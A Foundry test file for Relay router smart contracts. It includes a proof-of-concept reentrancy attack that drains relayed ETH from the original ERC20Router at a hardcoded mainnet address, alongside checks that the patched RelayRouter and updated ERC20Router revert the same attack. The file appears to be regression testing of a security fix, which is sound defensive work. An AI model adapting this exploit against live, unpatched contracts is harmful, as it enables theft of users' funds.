// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Multicaller} from "../src/v1/Multicaller.sol";
import {ERC20Router} from "../src/v1/ERC20RouterV1.sol";
import {RelayRouter} from "../src/v2/RelayRouter.sol";
import {Call3Value, Permit, Result} from "../src/v2/utils/RelayStructs.sol";
import {Attacker} from "./mocks/Attacker.sol";
import {BaseRelayTest} from "./base/BaseRelayTest.sol";
import {IUniswapV2Router01} from "./interfaces/IUniswapV2Router02.sol";
import {TestERC721_ERC20PaymentToken} from "./mocks/TestERC721_ERC20PaymentToken.sol";

interface iM {
    function multicall(
        Call3Value[] calldata calls,
        address refundTo,
        address nftRecipient
    ) external payable returns (Result[] memory returnData);

    function setApprovalForAll(address operator, bool approved) external;
}

contract ReentrancyTest is Test, BaseRelayTest {
    error Unauthorized();
    error Reentrancy();
    error InvalidMsgSender(address msgSender, address expectedMsgSender);

    address routerV1;
    ERC20Router updatedRouterV1;
    address routerV2;
    Attacker attacker1;
    Attacker attacker2;
    Attacker attacker3;
    address multicaller;

    function setUp() public override {
        super.setUp();
        console.log("SETUP");
        routerV1 = 0xA1BEa5fe917450041748Dbbbe7E9AC57A4bBEBaB;
        updatedRouterV1 = new ERC20Router(PERMIT2);
        routerV2 = address(new RelayRouter());
        // Attempt to reenter in ERC20Router
        attacker1 = new Attacker(address(routerV1), true, false);
        // Attempt to reenter in RelayRouter
        attacker2 = new Attacker(address(routerV2), false, true);
        attacker3 = new Attacker(address(updatedRouterV1), true, false);
    }

    function testSuccessUpdatedRouterV1() public {
        // Deploy NFT that costs 20 USDC to mint
        TestERC721_ERC20PaymentToken nft = new TestERC721_ERC20PaymentToken(
            USDC
        );

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = USDC;

        bytes memory calldata1 = abi.encodeWithSelector(
            IUniswapV2Router01.swapExactETHForTokens.selector,
            0,
            path,
            address(updatedRouterV1),
            block.timestamp
        );
        bytes memory calldata2 = abi.encodeWithSelector(
            IERC20.approve.selector,
            address(nft),
            type(uint256).max
        );
        bytes memory calldata3 = abi.encodeWithSelector(
            nft.mint.selector,
            alice.addr,
            10
        );

        address[] memory targets = new address[](3);
        targets[0] = address(ROUTER_V2);
        targets[1] = address(USDC);
        targets[2] = address(nft);

        bytes[] memory datas = new bytes[](3);
        datas[0] = calldata1;
        datas[1] = calldata2;
        datas[2] = calldata3;

        uint256[] memory values = new uint256[](3);
        values[0] = 1 ether;
        values[1] = 0;
        values[2] = 0;

        uint256 relaySolverBalanceBefore = relaySolver.balance;
        uint256 routerUSDCBalanceBefore = IERC20(USDC).balanceOf(
            address(updatedRouterV1)
        );

        vm.prank(relaySolver);
        updatedRouterV1.delegatecallMulticall{value: 1 ether}(
            targets,
            datas,
            values,
            alice.addr
        );

        uint256 relaySolverBalanceAfterMulticall = relaySolver.balance;
        uint256 routerUSDCBalanceAfterMulticall = IERC20(USDC).balanceOf(
            address(updatedRouterV1)
        );

        assertEq(
            relaySolverBalanceBefore - relaySolverBalanceAfterMulticall,
            1 ether
        );
        assertGt(routerUSDCBalanceAfterMulticall, routerUSDCBalanceBefore);
        assertEq(nft.ownerOf(10), alice.addr);

        vm.prank(relaySolver);
        updatedRouterV1.cleanupERC20(USDC, alice.addr);

        uint256 aliceUSDCBalanceAfterCleanup = IERC20(USDC).balanceOf(
            alice.addr
        );
        uint256 routerUSDCBalanceAfterCleanup = IERC20(USDC).balanceOf(
            address(this)
        );
        assertEq(aliceUSDCBalanceAfterCleanup, routerUSDCBalanceAfterMulticall);
        assertEq(routerUSDCBalanceAfterCleanup, 0);
    }

    //this is what can happen if the attacker waponized the bug
    function testMoneyStealerStealDoAttack() public {
        console.log("TESTING ATTACK");
        moneyStealerStealAttack();
    }

    function moneyStealerStealAttack() internal {
        uint256 relayed_value = 0.0208 ether;

        address[] memory targets = new address[](1);
        targets[0] = address(attacker1);

        bytes[] memory datas = new bytes[](1);
        datas[0] = "";

        uint256[] memory values = new uint256[](1);
        values[0] = relayed_value;

        Call3Value[] memory calls = new Call3Value[](1);
        calls[0] = Call3Value({
            target: address(attacker2),
            allowFailure: false,
            value: relayed_value,
            callData: ""
        });

        bytes memory payloadV1 = abi.encodeWithSelector(
            ERC20Router.delegatecallMulticall.selector,
            targets,
            datas,
            values,
            address(0)
        );

        bytes memory payloadV2 = abi.encodeWithSelector(
            RelayRouter.multicall.selector,
            calls,
            address(0),
            address(0)
        );

        targets[0] = address(attacker3);

        address attacker3_target = attacker3.target();
        console.log("ATTACKER3 TARGET", attacker3_target);
        bytes memory payloadV3 = abi.encodeWithSelector(
            ERC20Router.delegatecallMulticall.selector,
            targets,
            datas,
            values,
            address(0)
        );

        bool success;

        uint256 attacker1_initial_balance = address(attacker1).balance;
        uint256 attacker2_initial_balance = address(attacker2).balance;
        uint256 attacker3_initial_balance = address(attacker3).balance;
        uint256 routerV1_initial_balance = routerV1.balance;
        uint256 routerV2_initial_balance = routerV2.balance;
        uint256 updatedRouterV1_initial_balance = address(updatedRouterV1)
            .balance;

        console.log("ATTACKER1 INITIAL BALANCE", attacker1_initial_balance);
        console.log("ATTACKER2 INITIAL BALANCE", attacker2_initial_balance);
        console.log("ATTACKER3 INITIAL BALANCE", attacker3_initial_balance);
        console.log("ROUTER1 INITIAL BALANCE", routerV1_initial_balance);
        console.log("ROUTER2 INITIAL BALANCE", routerV2_initial_balance);
        console.log(
            "UPDATED ROUTER1 INITIAL BALANCE",
            updatedRouterV1_initial_balance
        );

        // Original vulnerability
        vm.startPrank(relaySolver);
        (success, ) = routerV1.call{value: relayed_value}(payloadV1);
        if (!success) {
            revert();
        }

        // Updated RelayRouter with ReentrancyGuard
        vm.expectRevert("Multicall3: call failed");
        (success, ) = routerV2.call{value: relayed_value}(payloadV2);
        if (!success) {
            revert();
        }

        // Attempt to reenter in ERC20Router
        vm.expectRevert(
            abi.encodeWithSelector(
                InvalidMsgSender.selector,
                relaySolver,
                address(attacker3)
            )
        );
        (success, ) = address(updatedRouterV1).call{value: relayed_value}(
            payloadV3
        );
        if (!success) {
            revert();
        }

        vm.stopPrank();

        uint256 attacker1_final_balance = address(attacker1).balance;
        uint256 attacker2_final_balance = address(attacker2).balance;
        uint256 attacker3_final_balance = address(attacker3).balance;
        uint256 attacker1_profit = attacker1_final_balance -
            attacker1_initial_balance;
        uint256 attacker2_profit = attacker2_final_balance -
            attacker2_initial_balance;
        uint256 attacker3_profit = attacker3_final_balance -
            attacker3_initial_balance;

        uint256 routerV1_difference = routerV1.balance -
            routerV1_initial_balance;
        uint256 routerV2_difference = routerV2.balance -
            routerV2_initial_balance;
        uint256 updatedRouterV1_difference = address(updatedRouterV1).balance -
            updatedRouterV1_initial_balance;

        console.log("ATTACKER1 PROFIT", attacker1_profit);
        console.log("ATTACKER2 PROFIT", attacker2_profit);
        console.log("ATTACKER3 PROFIT", attacker3_profit);
        console.log("ROUTER1 DIFFERENCE", routerV1_difference);
        console.log("ROUTER2 DIFFERENCE", routerV2_difference);
        console.log("UPDATED ROUTER1 DIFFERENCE", updatedRouterV1_difference);

        assertEq(attacker1_profit, relayed_value);
        assertEq(attacker2_profit, 0);
        assertEq(routerV1_difference, 0);
        assertEq(routerV2_difference, 0);
        assertEq(updatedRouterV1_difference, 0);
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        iM(msg.sender).setApprovalForAll(
            0x1E0049783F008A0085193E00003D00cd54003c71,
            true
        );

        //approve the OpenSea conduit so we can list the listing
        return this.onERC1155Received.selector;
    }

    //so this contract can list on OpenSea
    function isValidSignature(
        bytes32,
        bytes memory
    ) public pure returns (bytes4 magicValue) {
        magicValue = this.isValidSignature.selector;
    }

    receive() external payable {}

    function stealthemoney() external payable {}

    fallback() external payable {
        console.log("FALLBACK", msg.sender);
    }
}
